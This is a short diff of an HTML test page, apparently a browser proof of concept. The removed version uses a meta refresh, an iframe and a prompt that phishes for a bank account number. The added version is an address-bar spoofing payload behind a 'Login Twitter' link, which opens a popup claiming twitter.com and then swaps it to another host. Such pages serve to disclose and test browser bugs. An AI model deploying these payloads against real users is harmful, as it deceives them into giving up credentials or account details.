@@ -1,12 +1,12 @@
-<META HTTP-EQUIV="refresh" CONTENT="0;url=code1.html">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
-<iframe src="code2.html"></iframe>
 <script>
-setTimeout('sleep()',500);
-alert(2); //alert twice
-function sleep()
-{
-document.write("123<br>");
-var mes = prompt('Dear user:\nI need your Bank account number','');
-document.write(mes+"<br>");
-}
+  function next() {
+         w.location.replace('http://wrong.host.badssl.com/');
+        }
+
+  function f() {
+    w = window.open("javascript:document.write('spoof');location='http://twitter.com'","new","width=500 height=500");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
 </script>
+
+<a href="#" onclick="f()">Login Twitter</a>
